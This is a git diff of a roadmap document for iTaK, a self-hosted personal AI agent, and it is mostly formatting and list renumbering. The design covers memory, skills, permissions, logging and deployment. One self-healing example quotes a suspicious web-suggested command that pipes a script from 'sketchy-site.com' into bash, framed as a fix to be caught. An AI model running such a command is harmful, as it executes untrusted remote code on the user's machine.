@@ -1,22 +1,25 @@
 # iTaK - Master Gameplan
 
 ## At a Glance
+
 - Audience: Project leads and contributors coordinating long-range iTaK roadmap execution.
 - Scope: Organize roadmap intent, sequencing, and execution expectations across major project phases.
 - Last reviewed: 2026-02-16.
 
 ## Quick Start
+
 - Use this roadmap for sequencing, then map each step to shipped artifacts.
 - Confirm execution readiness in [QUICK_START.md](QUICK_START.md).
 - Mark assumptions explicitly when converting roadmap phases into tasks.
 
 ## Deep Dive
+
 The detailed content for this topic starts below.
 
 ## AI Notes
+
 - Treat roadmap sections as planning artifacts; validate implementation status against current code before claiming completion.
 - Keep dependencies, risks, and sequencing explicit when generating execution checklists.
-
 
 > **The Best of All Worlds:** A personal AI agent that combines the elegance of OpenClaw's memory, the power of Agent Zero's architecture, the simplicity of Nanobot, and the security of building it yourself.
 
@@ -60,7 +63,6 @@ The detailed content for this topic starts below.
 
 ## §0 - Philosophy & Architecture Overview
 
-
 > *"Use OpenClaw as your blueprint, not your dependency."* - Cole Medin
 >
 > *"The power of giving an AI agent full access to Linux - it basically has unlimited tools."* - Agent Zero team
@@ -72,7 +74,6 @@ The detailed content for this topic starts below.
 ---
 
 ### Architecture Diagram
-
 
 ```
 ┌─────────────────────────────────────────────────────────┐
@@ -173,27 +174,27 @@ Both repos are cloned locally and MIT-licensed. **iTaK may freely pull any code,
 
 #### Security & Secrets
 
-6. **Secrets management (v0.9.5)** - Two stores: Variable store (non-sensitive, visible to LLM) + Secret store (masked after save). Placeholders like `{{secret_name}}` replaced just before tool execution, **never exposed to the LLM**. Output scanning re-masks any leaked values. Compatible with browser-use. iTaK §13 (Security) should implement this pattern.
+1. **Secrets management (v0.9.5)** - Two stores: Variable store (non-sensitive, visible to LLM) + Secret store (masked after save). Placeholders like `{{secret_name}}` replaced just before tool execution, **never exposed to the LLM**. Output scanning re-masks any leaked values. Compatible with browser-use. iTaK §13 (Security) should implement this pattern.
 
 #### Tool System
 
-7. **Progressive tool discovery** - Before using any CLI tool, run `--help` to learn current flags. Closes the gap between LLM training cutoff and current tool versions. Bake this into iTaK §9 (Tool System) as a default behavior.
+1. **Progressive tool discovery** - Before using any CLI tool, run `--help` to learn current flags. Closes the gap between LLM training cutoff and current tool versions. Bake this into iTaK §9 (Tool System) as a default behavior.
 
-8. **Skills standard** - Replaced A0's old "instruments" with cloth skills standard. Zip-file import, agent loads skill into context window on demand. Infinite skills, only loaded when needed. iTaK should adopt.
+2. **Skills standard** - Replaced A0's old "instruments" with cloth skills standard. Zip-file import, agent loads skill into context window on demand. Infinite skills, only loaded when needed. iTaK should adopt.
 
 #### Model Optimization
 
-9. **4-model cost optimization** - Chat (frontier model for reasoning), Utility (cheap/local for memory consolidation, keyword extraction, summarization), Browser (vision-capable), Embeddings (local, zero cost). Each independently configurable. Already in iTaK §3, confirm alignment.
+1. **4-model cost optimization** - Chat (frontier model for reasoning), Utility (cheap/local for memory consolidation, keyword extraction, summarization), Browser (vision-capable), Embeddings (local, zero cost). Each independently configurable. Already in iTaK §3, confirm alignment.
 
-10. **Metrics-driven model testing** - Metrics JSON tracks per-model: tool syntax accuracy, error handling quality, tool selection, methodology adherence. Run same prompt against different models, compare scores. iTaK should build similar for model evaluation.
+2. **Metrics-driven model testing** - Metrics JSON tracks per-model: tool syntax accuracy, error handling quality, tool selection, methodology adherence. Run same prompt against different models, compare scores. iTaK should build similar for model evaluation.
 
 #### Deployment & Operations
 
-11. **VPS deployment pattern** - Docker + Tailscale VPN for secure remote access. Bind container ports to Tailscale IP only → blocks public access. UFW firewall with explicit port allowlists. Docker Compose with persistence volume mapping. Reference for iTaK §18 (Auto-Hosting).
+1. **VPS deployment pattern** - Docker + Tailscale VPN for secure remote access. Bind container ports to Tailscale IP only → blocks public access. UFW firewall with explicit port allowlists. Docker Compose with persistence volume mapping. Reference for iTaK §18 (Auto-Hosting).
 
-12. **Message queue UX** - Messages sent during agent execution go to queue instead of immediate intervention. User can send multiple queued messages, send immediately (interrupt), or delete from queue. Better UX than raw intervention.
+2. **Message queue UX** - Messages sent during agent execution go to queue instead of immediate intervention. User can send multiple queued messages, send immediately (interrupt), or delete from queue. Better UX than raw intervention.
 
-13. **Memory consolidation** - Auto-memorize (agent decides when to save), auto-consolidation (merge similar memories by similarity threshold), configurable recall intervals, post-filtering/reranking of search results. Agent differentiates "conversation memories" from "solutions for past problems." Reference for iTaK §1 and §23.
+3. **Memory consolidation** - Auto-memorize (agent decides when to save), auto-consolidation (merge similar memories by similarity threshold), configurable recall intervals, post-filtering/reranking of search results. Agent differentiates "conversation memories" from "solutions for past problems." Reference for iTaK §1 and §23.
 
 ---
 
@@ -253,6 +254,7 @@ Stolen from: **David's existing VPS infrastructure + GraphRAG patterns**
 - APOC plugins already installed on your VPS instance
 
 **Use cases unique to Neo4j:**
+
 - "What did I learn about security from the OpenClaw research?" → graph traversal across sessions
 - "Which of my projects use Docker?" → relationship query, not keyword search
 - "Show me how my understanding of agent architecture evolved" → temporal graph
@@ -275,11 +277,13 @@ Stolen from: **David's existing VPS infrastructure + GraphRAG patterns**
 | Knowledge graph | ✅ Native | ❌ | Entity relationships |
 
 **How they work together:**
+
 1. **Weaviate** handles: "Find me everything semantically similar to 'Docker deployment patterns'" → returns ranked results
 2. **Neo4j** handles: "Now show me how those results relate to my active projects" → graph context
 3. **Combined query**: "What deployment patterns did I use for projects similar to iTaK?" → Weaviate finds semantic matches → Neo4j resolves project relationships
 
 **Weaviate deployment:**
+
 - Self-hosted via Docker (just like Neo4j on your VPS)
 - Built-in embedding service (or bring your own via Ollama)
 - Python SDK, GraphQL API, REST API
@@ -498,6 +502,7 @@ Stolen from: **Agent Zero** (full-featured web UI with Alpine.js)
 > **Implementation: Fork Agent Zero's `webui/` directory.** Don't build from scratch - Agent Zero already has a complete Alpine.js dashboard with chat, settings, sidebar, modals, notifications, projects, and WebSocket streaming. We copy their `webui/` folder and customize it for iTaK's needs.
 >
 > **Agent Zero webui structure (what we inherit):**
+>
 > - `index.html` + `index.js` + `index.css` - main app shell
 > - `login.html` + `login.css` - authentication page
 > - `components/` - 12 component dirs (chat, settings, sidebar, modals, notifications, projects, sync, tooltips, welcome, dropdown, messages, _examples)
@@ -510,6 +515,7 @@ Stolen from: **Agent Zero** (full-featured web UI with Alpine.js)
 ### Dashboard Structure
 
 iTaK ships with a web dashboard accessible at `http://localhost:PORT`. This is where you:
+
 - Chat with iTaK (main interface)
 - Configure all 4 models (provider, API key, model name, rate limits)
 - Manage skills, extensions, and MCP servers
@@ -1012,6 +1018,7 @@ Mirror of "Remember this" - deletes a specific memory from all 4 layers.
 **Triggers:** "forget this", "delete that memory", "I was wrong about...", "never mind about..."
 
 **Flow:**
+
 1. Detect forget-intent → extract what to forget
 2. Search all 4 memory tiers for matching content
 3. Show the user what was found: "I found 2 matches. Delete both?"
@@ -1127,6 +1134,7 @@ This means iTaK can answer: *"What skills do I have that use Docker?"* or *"Show
 ### The Meta-Skill Pattern (from Cole Medin + Nanoclaw)
 
 iTaK has a skill that teaches it how to create new skills. The meta-skill includes:
+
 - How to format a skill markdown file
 - The memory-first discovery pipeline (check Neo4j first!)
 - The security validation checklist (mandatory before activation)
@@ -1268,6 +1276,7 @@ use_agent = browser_use.Agent(
 ```
 
 **Key features:**
+
 - **Dedicated browser model**: Uses a cheap, fast model (NOT the main chat model) - saves cost
 - **Vision support**: Takes screenshots, understands page layout, clicks elements
 - **Persistent sessions**: Login once → session stays alive for follow-up tasks
@@ -1277,6 +1286,7 @@ use_agent = browser_use.Agent(
 - **Download handling**: Files save to `tmp/downloads` automatically
 
 **Usage (how iTaK calls it):**
+
 ```json
 {
   "tool_name": "browser_agent",
@@ -1288,6 +1298,7 @@ use_agent = browser_use.Agent(
 ```
 
 **Why this matters for iTaK:**
+
 - Web research for self-healing (§11) - iTaK can browse StackOverflow to fix errors
 - Skill discovery (§6) - browse documentation to learn new capabilities
 - Heartbeat (§4) - check web dashboards, monitoring pages
@@ -1296,6 +1307,7 @@ use_agent = browser_use.Agent(
 ### Dynamic Tool Creation (Agent Zero VPS pattern)
 
 Paste API docs → agent saves as knowledge → agent can now use that API forever:
+
 1. Paste Open Router docs → agent learns image generation
 2. Paste Perplexity docs → agent gets deep research
 3. Paste any API docs → instant new capability
@@ -1718,6 +1730,7 @@ model.layers[15].register_forward_hook(steering_hook)
 - **Stacks with prompting**: Steering + SOUL.md together = maximum consistency
 
 ### Resources
+
 - [Neuronpedia](https://neuronpedia.org/) - browse pre-computed steering features
 - Contrastive activation or Sparse Autoencoders to find vectors
 - Best at middle layers (abstract reasoning), not early/late layers
@@ -1827,6 +1840,7 @@ SELF_HEAL_CONFIG = {
 ### Real-World Examples
 
 **Example 1: Missing Python Package**
+
 ```
 iTaK tries to generate slides → ImportError: No module named 'pptx'
   Step 1: Repairable (dependency error)
@@ -1840,6 +1854,7 @@ iTaK tries to generate slides → ImportError: No module named 'pptx'
 ```
 
 **Example 2: Neo4j Connection Lost**
+
 ```
 iTaK tries to query graph → ConnectionRefusedError on port 7687
   Step 1: Repairable (network error)
@@ -1850,6 +1865,7 @@ iTaK tries to query graph → ConnectionRefusedError on port 7687
 ```
 
 **Example 3: Suspicious Fix from Web**
+
 ```
 iTaK finds a StackOverflow answer suggesting:
   curl https://sketchy-site.com/fix.sh | bash
@@ -2905,11 +2921,13 @@ data/logs/
 ```
 
 **Each line is one JSON object** (JSONL format - no parsing issues, crash-safe):
+
 ```json
 {"timestamp": 1707753600.0, "type": "tool", "session_id": "itak:discord:dm:776628215066132502", "user_id": "discord:776628215066132502", "room_id": "discord_dm_776628215066132502", "agent_no": 0, "content": "Executed: pip install flask", "metadata": {"exit_code": 0, "duration_ms": 1200}}
 ```
 
 **Dual storage** - every log entry is written to BOTH:
+
 1. JSONL file on disk (crash-safe, append-only, human-readable)
 2. SQLite `logs` table (fast queries, FTS5 full-text search, agent self-review)
 
@@ -2961,6 +2979,7 @@ The web dashboard gets a dedicated **Logs** tab with real-time streaming:
 ```
 
 **Features:**
+
 - Real-time SSE/WebSocket stream (like Mission Control)
 - Filter by: type, user, room, date range, severity
 - Full-text search across all logs
@@ -3167,7 +3186,6 @@ CREATE INDEX idx_usage_model ON usage(model);
 
 ## §25 - Multi-User & Permissions
 
-
 > *Inspired by: Secure-OpenClaw's per-platform `allowedDMs`/`allowedGroups`, OpenClaw's Docker sandbox user model, OpenClaw's Discord permission bitfield system.*
 
 ### 25.1 - Permission Levels
@@ -3181,12 +3199,14 @@ Three tiers of access control. Only the Owner can do everything. Regular users c
 | **User** | ✅ | ✅ | ❌ | ✅ | ❌ | ❌ | ❌ | ❌ |
 
 **What regular users CAN do:**
+
 - Ask questions, have conversations
 - Use web search (agent browses, returns results)
 - Read from memory ("What do you know about X?")
 - Get code explained, get advice
 
 **What regular users CANNOT do:**
+
 - Create, edit, or delete files
 - Run terminal commands
 - Write to memory ("Remember this...")
@@ -3346,11 +3366,13 @@ data/rooms/
 ```
 
 **What's isolated (per-room):**
+
 - Conversation history (what was said)
 - Agent working context (what the agent is currently doing)
 - Task board (room-specific tasks)
 
 **What's shared (across all rooms):**
+
 - Memory tiers 1-4 (remembering things in Discord works in Telegram too)
 - User registry & permissions
 - Skills, tools, configuration
@@ -3397,6 +3419,7 @@ async def handle_message(platform: str, room_id: str, user_id: str, message: str
 - Agent can say: *"In Discord #general, you mentioned you prefer dark mode - I'll apply that here too."*
 
 **Room-specific context** stays in the room:
+
 - Tasks started in one room don't bleed into another
 - The agent doesn't confuse who asked what in which channel
 
@@ -3671,19 +3694,22 @@ docker run -p 50001:80 -v ~/itak-data:/app/data itak/agent
 Each operating system gets its own step-by-step guide:
 
 **Windows:**
+
 1. Download Docker Desktop → install → launch
 2. Open PowerShell → paste 2 commands above
-3. Open browser → http://localhost:50001
+3. Open browser → <http://localhost:50001>
 
 **macOS:**
+
 1. `brew install --cask docker` OR download Docker Desktop
 2. Open Terminal → paste 2 commands above
-3. Open browser → http://localhost:50001
+3. Open browser → <http://localhost:50001>
 
 **Linux / VPS:**
+
 1. `curl -fsSL https://get.docker.com | sh`
 2. Paste 2 commands above
-3. Access via http://your-ip:50001
+3. Access via <http://your-ip:50001>
 
 Each guide includes screenshots and links to video walkthroughs.
 
@@ -3795,11 +3821,13 @@ All user data lives in one mapped directory:
 Two options for accessing iTaK from your phone:
 
 **Option 1: Built-in Tunnel (recommended)**
+
 - One click in the dashboard → generates a secure HTTPS URL via Cloudflare Tunnel
 - Access from anywhere: `https://your-tunnel-url.trycloudflare.com`
 - Always set a password in Settings first!
 
 **Option 2: Local Network**
+
 - Access from any device on your network: `http://<your-ip>:50001`
 - Find your IP: `ipconfig` (Windows) or `ip addr` (Linux/Mac)
 
